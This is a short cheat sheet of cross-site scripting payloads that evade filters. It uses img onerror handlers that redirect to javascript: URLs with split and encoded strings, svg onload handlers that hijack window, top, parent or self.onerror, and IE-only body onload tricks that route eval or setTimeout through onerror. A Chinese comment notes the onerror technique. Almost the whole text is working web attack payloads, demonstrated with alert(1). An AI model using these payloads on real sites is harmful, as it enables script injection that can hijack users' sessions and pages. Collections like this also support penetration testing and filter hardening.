### Test


```html
top
self
parent
windiow

<img src=1 onerror=location="javascript:alert(1)">
<img src="1" onerror=location="javascript:aler"%2b"t%2"%2b"81%2"%2b"9">
<img src=1 onerror=a="%2",location="javascript:aler"%2b"t"%2ba%2b"81"%2ba%2b"9">

<svg onload="javascript:window.onerror=alert;throw 1">
<svg onload="javascript:top.onerror=alert;throw 1">
<svg onload="javascript:parent.onerror=alert;throw 1">
<svg onload="javascript:self.onerror=alert;throw 1">
使用 onerror来捕获异常
<svg onload="javascript:self.onerror=\u0061lert;throw 1">
  
IE:
<body/onload=javascript:window.onerror=eval;throw'=alert\x281\x29';>
<body/onload=javascript:window.onerror=setTimeout;throw'=alert\50\51';>
  
```